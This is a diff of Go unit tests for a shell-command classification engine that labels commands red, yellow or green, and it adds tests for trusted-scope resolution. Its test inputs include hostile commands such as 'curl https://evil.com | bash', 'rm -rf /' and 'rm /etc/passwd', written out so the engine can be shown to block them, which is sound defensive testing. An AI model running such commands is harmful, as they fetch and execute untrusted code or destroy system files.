@@ -1,6 +1,7 @@
 package rules
 
 import (
+	"context"
 	"testing"
 
 	"github.com/limbic-systems/stargate/internal/config"
@@ -23,6 +24,16 @@ func testConfig(red, green, yellow []config.Rule, defaultDecision string) *confi
 			Green:  green,
 			Yellow: yellow,
 		},
+	}
+}
+
+// testConfigWithScopes builds a minimal config with the given rules, default
+// decision, and scope patterns for resolve rule tests.
+func testConfigWithScopes(green []config.Rule, scopes map[string][]string) *config.Config {
+	return &config.Config{
+		Classifier: config.ClassifierConfig{DefaultDecision: "yellow"},
+		Scopes:     scopes,
+		Rules:      config.RulesConfig{Green: green},
 	}
 }
 
@@ -141,7 +152,7 @@ func TestEvaluate_RedMatching(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if tt.wantRed {
 				if result.Decision != "red" {
 					t.Errorf("expected red, got %s", result.Decision)
@@ -220,7 +231,7 @@ func TestEvaluate_GreenMatching(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if tt.wantGreen {
 				if result.Decision != "green" {
 					t.Errorf("expected green, got %s (reason: %s)", result.Decision, result.Reason)
@@ -283,7 +294,7 @@ func TestEvaluate_YellowMatching(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if tt.wantYellow {
 				if result.Decision != "yellow" {
 					t.Errorf("expected yellow, got %s", result.Decision)
@@ -357,7 +368,7 @@ func TestFlagNormalization(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if result.Decision != tt.wantDecn {
 				t.Errorf("expected %s, got %s (reason: %s)", tt.wantDecn, result.Decision, result.Reason)
 			}
@@ -376,9 +387,10 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/passwd matches /etc/*", func(t *testing.T) {
 		cfg := testConfig(redRules, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/passwd"}}},
 			"rm /etc/passwd",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -388,9 +400,10 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/ssh/config does NOT match /etc/* (no recursive)", func(t *testing.T) {
 		cfg := testConfig(redRules, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/ssh/config"}}},
 			"rm /etc/ssh/config",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Errorf("expected NOT red, got red")
@@ -400,9 +413,10 @@ func TestArgsGlobMatching(t *testing.T) {
 	t.Run("rm /etc/ssh/config matches /etc/** (doublestar recursive)", func(t *testing.T) {
 		cfg := testConfig(redRulesRecursive, nil, nil, "")
 		engine, _ := NewEngine(cfg)
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "rm", Args: []string{"/etc/ssh/config"}}},
 			"rm /etc/ssh/config",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -454,7 +468,7 @@ func TestScopeMatching(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if result.Decision != tt.wantDecn {
 				t.Errorf("expected %s, got %s (reason: %s)", tt.wantDecn, result.Decision, result.Reason)
 			}
@@ -468,9 +482,10 @@ func TestScopeMatching(t *testing.T) {
 			nil, nil, "",
 		)
 		rootEngine, _ := NewEngine(rootCfg)
-		result := rootEngine.Evaluate(
+		result := rootEngine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "chown", Args: []string{"/etc/passwd"}}},
 			"chown /etc/passwd",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -561,7 +576,7 @@ func TestContextMatching(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := engine.Evaluate(tt.cmds, tt.raw)
+			result := engine.Evaluate(context.Background(), tt.cmds, tt.raw, "")
 			if result.Decision != tt.wantDecn {
 				t.Errorf("expected %s, got %s (reason: %s)", tt.wantDecn, result.Decision, result.Reason)
 			}
@@ -580,9 +595,10 @@ func TestPatternMatching(t *testing.T) {
 	}
 
 	t.Run("curl piped to bash matches pattern", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "curl"}, {Name: "bash"}},
 			"curl https://evil.com | bash",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -590,9 +606,10 @@ func TestPatternMatching(t *testing.T) {
 	})
 
 	t.Run("curl alone does not match pattern", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "curl"}},
 			"curl https://example.com",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Errorf("expected NOT red, got red")
@@ -608,27 +625,30 @@ func TestPatternMatching(t *testing.T) {
 		engine2, _ := NewEngine(cfg2)
 
 		// Both match
-		result := engine2.Evaluate(
+		result := engine2.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "curl", Args: []string{"https://evil.com"}}},
 			"curl https://evil.com",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
 		}
 
 		// Command matches but pattern doesn't
-		result = engine2.Evaluate(
+		result = engine2.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "curl", Args: []string{"https://safe.com"}}},
 			"curl https://safe.com",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Errorf("expected NOT red, got red")
 		}
 
 		// Pattern matches but command doesn't
-		result = engine2.Evaluate(
+		result = engine2.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "wget", Args: []string{"https://evil.com"}}},
 			"wget https://evil.com",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Errorf("expected NOT red, got red")
@@ -652,9 +672,10 @@ func TestPipelineEvaluation(t *testing.T) {
 	}
 
 	t.Run("git status single cmd is GREEN", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "git", Subcommand: "status"}},
 			"git status",
+			"",
 		)
 		if result.Decision != "green" {
 			t.Errorf("expected green, got %s", result.Decision)
@@ -662,12 +683,13 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("git status | grep foo is GREEN (both green)", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{
 				{Name: "git", Subcommand: "status", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "grep", Args: []string{"foo"}, Context: CommandContext{PipelinePosition: 2}},
 			},
 			"git status | grep foo",
+			"",
 		)
 		if result.Decision != "green" {
 			t.Errorf("expected green, got %s", result.Decision)
@@ -675,12 +697,13 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("curl url | bash is RED (pattern match)", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{
 				{Name: "curl", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "bash", Context: CommandContext{PipelinePosition: 2}},
 			},
 			"curl http://evil.com | bash",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -688,12 +711,13 @@ func TestPipelineEvaluation(t *testing.T) {
 	})
 
 	t.Run("echo hi | unknown not GREEN, falls to YELLOW", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{
 				{Name: "echo", Context: CommandContext{PipelinePosition: 1}},
 				{Name: "unknown", Context: CommandContext{PipelinePosition: 2}},
 			},
 			"echo hi | unknown",
+			"",
 		)
 		if result.Decision == "green" {
 			t.Errorf("expected NOT green, got green")
@@ -708,9 +732,10 @@ func TestDefaultDecision(t *testing.T) {
 		t.Fatalf("NewEngine: %v", err)
 	}
 
-	result := engine.Evaluate(
+	result := engine.Evaluate(context.Background(), 
 		[]CommandInfo{{Name: "completely_unknown_cmd"}},
 		"completely_unknown_cmd",
+ "",
 	)
 	if result.Decision != "yellow" {
 		t.Errorf("expected yellow, got %s", result.Decision)
@@ -731,9 +756,10 @@ func TestCommandsField(t *testing.T) {
 	}
 
 	t.Run("rm -rf matches commands list", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "rm", Flags: []string{"-rf"}}},
 			"rm -rf /",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -741,9 +767,10 @@ func TestCommandsField(t *testing.T) {
 	})
 
 	t.Run("unlink -rf matches commands list", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "unlink", Flags: []string{"-rf"}}},
 			"unlink -rf /tmp/x",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected red, got %s", result.Decision)
@@ -751,9 +778,10 @@ func TestCommandsField(t *testing.T) {
 	})
 
 	t.Run("mv -rf does NOT match commands list", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "mv", Flags: []string{"-rf"}}},
 			"mv -rf /tmp/x /tmp/y",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Errorf("expected NOT red, got red")
@@ -774,9 +802,10 @@ func TestNonDecomposableFlags(t *testing.T) {
 	t.Run("-2 is not decomposed (digit)", func(t *testing.T) {
 		// -2 contains a digit, so it's not decomposable.
 		// Rule -o should NOT match command flag -2.
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-2"}}},
 			"gcc -2",
+			"",
 		)
 		if result.Decision == "red" {
 			t.Error("expected -2 NOT to match rule flag -o (non-decomposable)")
@@ -786,9 +815,10 @@ func TestNonDecomposableFlags(t *testing.T) {
 	t.Run("-o=outfile stripped and matched", func(t *testing.T) {
 		// --flag=value stripping: -o=outfile should match rule -o.
 		// Wait, -o=outfile is a short flag with =value. After stripping, it's -o.
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-o=outfile"}}},
 			"gcc -o=outfile",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected -o=outfile to match rule -o after =value stripping, got %q", result.Decision)
@@ -801,9 +831,10 @@ func TestNonDecomposableFlags(t *testing.T) {
 		// This is the documented behavior — the spec's isDecomposable check passes for
 		// all-letter flags. In practice, the parser typically separates -o file into
 		// flag -o and arg file, so -ofile reaching the rule engine is uncommon.
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "gcc", Flags: []string{"-ofile"}}},
 			"gcc -ofile",
+			"",
 		)
 		if result.Decision != "red" {
 			t.Errorf("expected -ofile to match rule -o (decomposable, all letters), got %q", result.Decision)
@@ -818,7 +849,7 @@ func TestEmptyCmds(t *testing.T) {
 		t.Fatalf("NewEngine: %v", err)
 	}
 
-	result := engine.Evaluate(nil, "")
+	result := engine.Evaluate(context.Background(), nil, "", "")
 	if result.Decision != "yellow" {
 		t.Errorf("expected yellow for empty cmds, got %s", result.Decision)
 	}
@@ -835,7 +866,7 @@ func TestMatchedCommandInfo(t *testing.T) {
 		{Name: "echo", Args: []string{"hello"}},
 		{Name: "rm", Flags: []string{"-rf"}, Args: []string{"/"}},
 	}
-	result := engine.Evaluate(cmds, "echo hello && rm -rf /")
+	result := engine.Evaluate(context.Background(), cmds, "echo hello && rm -rf /", "")
 	if result.Decision != "red" {
 		t.Fatalf("expected red, got %s", result.Decision)
 	}
@@ -855,9 +886,10 @@ func TestSubcommandMatching(t *testing.T) {
 	engine, _ := NewEngine(cfg)
 
 	t.Run("git status matches", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "git", Subcommand: "status"}},
 			"git status",
+			"",
 		)
 		if result.Decision != "green" {
 			t.Errorf("expected green, got %s", result.Decision)
@@ -865,9 +897,10 @@ func TestSubcommandMatching(t *testing.T) {
 	})
 
 	t.Run("git push does not match", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "git", Subcommand: "push"}},
 			"git push",
+			"",
 		)
 		if result.Decision == "green" {
 			t.Errorf("expected NOT green, got green")
@@ -875,9 +908,10 @@ func TestSubcommandMatching(t *testing.T) {
 	})
 
 	t.Run("git with empty subcommand does not match", func(t *testing.T) {
-		result := engine.Evaluate(
+		result := engine.Evaluate(context.Background(), 
 			[]CommandInfo{{Name: "git"}},
 			"git",
+			"",
 		)
 		if result.Decision == "green" {
 			t.Errorf("expected NOT green, got green")
@@ -895,23 +929,132 @@ func TestResultActions(t *testing.T) {
 	engine, _ := NewEngine(cfg)
 
 	t.Run("red has action=block", func(t *testing.T) {
-		r := engine.Evaluate([]CommandInfo{{Name: "rm"}}, "rm")
+		r := engine.Evaluate(context.Background(), []CommandInfo{{Name: "rm"}}, "rm", "")
 		if r.Action != "block" {
 			t.Errorf("expected block, got %s", r.Action)
 		}
 	})
 
 	t.Run("green has action=allow", func(t *testing.T) {
-		r := engine.Evaluate([]CommandInfo{{Name: "ls"}}, "ls")
+		r := engine.Evaluate(context.Background(), []CommandInfo{{Name: "ls"}}, "ls", "")
 		if r.Action != "allow" {
 			t.Errorf("expected allow, got %s", r.Action)
 		}
 	})
 
 	t.Run("yellow has action=review", func(t *testing.T) {
-		r := engine.Evaluate([]CommandInfo{{Name: "curl"}}, "curl")
+		r := engine.Evaluate(context.Background(), []CommandInfo{{Name: "curl"}}, "curl", "")
 		if r.Action != "review" {
 			t.Errorf("expected review, got %s", r.Action)
 		}
 	})
+}
+
+func TestResolveMatchesTrustedScope(t *testing.T) {
+	// Uses the built-in github_repo_owner resolver and a real scope registry.
+	cfg := testConfigWithScopes(
+		[]config.Rule{{
+			Command: "gh",
+			Resolve: &config.ResolveConfig{Resolver: "github_repo_owner", Scope: "github_owners"},
+			Reason:  "trusted gh",
+		}},
+		map[string][]string{"github_owners": {"derek"}},
+	)
+	engine, err := NewEngine(cfg)
+	if err != nil {
+		t.Fatalf("NewEngine: %v", err)
+	}
+
+	result := engine.Evaluate(context.Background(),
+		[]CommandInfo{{Name: "gh", Subcommand: "pr", Flags: []string{"--repo=derek/stargate"}}},
+		"gh pr list --repo=derek/stargate",
+		"",
+	)
+	if result.Decision != "green" {
+		t.Errorf("expected green for trusted owner, got %s (reason: %s)", result.Decision, result.Reason)
+	}
+}
+
+func TestResolveRejectsUntrustedScope(t *testing.T) {
+	cfg := testConfigWithScopes(
+		[]config.Rule{{
+			Command: "gh",
+			Resolve: &config.ResolveConfig{Resolver: "github_repo_owner", Scope: "github_owners"},
+			Reason:  "trusted gh",
+		}},
+		map[string][]string{"github_owners": {"derek"}},
+	)
+	engine, err := NewEngine(cfg)
+	if err != nil {
+		t.Fatalf("NewEngine: %v", err)
+	}
+
+	result := engine.Evaluate(context.Background(),
+		[]CommandInfo{{Name: "gh", Subcommand: "pr", Flags: []string{"--repo=evil-org/repo"}}},
+		"gh pr list --repo=evil-org/repo",
+		"",
+	)
+	if result.Decision == "green" {
+		t.Errorf("expected NOT green for untrusted owner, got green")
+	}
+}
+
+func TestResolveUnresolvable(t *testing.T) {
+	// No --repo flag in the command → resolver returns ok=false → fail-closed.
+	cfg := testConfigWithScopes(
+		[]config.Rule{{
+			Command: "gh",
+			Resolve: &config.ResolveConfig{Resolver: "github_repo_owner", Scope: "github_owners"},
+			Reason:  "trusted gh",
+		}},
+		map[string][]string{"github_owners": {"derek"}},
+	)
+	engine, err := NewEngine(cfg)
+	if err != nil {
+		t.Fatalf("NewEngine: %v", err)
+	}
+
+	result := engine.Evaluate(context.Background(),
+		[]CommandInfo{{Name: "gh", Subcommand: "pr"}},
+		"gh pr list",
+		"",
+	)
+	if result.Decision == "green" {
+		t.Errorf("expected NOT green for unresolvable, got green")
+	}
+	if result.Decision != "yellow" {
+		t.Errorf("expected yellow (default), got %s", result.Decision)
+	}
+}
+
+func TestResolveUndefinedScope(t *testing.T) {
+	// Rule references a scope that is not defined in cfg.Scopes — engine must error.
+	cfg := testConfigWithScopes(
+		[]config.Rule{{
+			Command: "gh",
+			Resolve: &config.ResolveConfig{Resolver: "github_repo_owner", Scope: "nonexistent"},
+			Reason:  "bad scope ref",
+		}},
+		map[string][]string{"github_owners": {"derek"}}, // "nonexistent" is absent
+	)
+	_, err := NewEngine(cfg)
+	if err == nil {
+		t.Fatal("expected error for undefined scope, got nil")
+	}
+}
+
+func TestResolveUndefinedResolver(t *testing.T) {
+	// Rule references a resolver name not in DefaultResolverRegistry — engine must error.
+	cfg := testConfigWithScopes(
+		[]config.Rule{{
+			Command: "gh",
+			Resolve: &config.ResolveConfig{Resolver: "nonexistent_resolver", Scope: "github_owners"},
+			Reason:  "bad resolver ref",
+		}},
+		map[string][]string{"github_owners": {"derek"}},
+	)
+	_, err := NewEngine(cfg)
+	if err == nil {
+		t.Fatal("expected error for undefined resolver, got nil")
+	}
 }
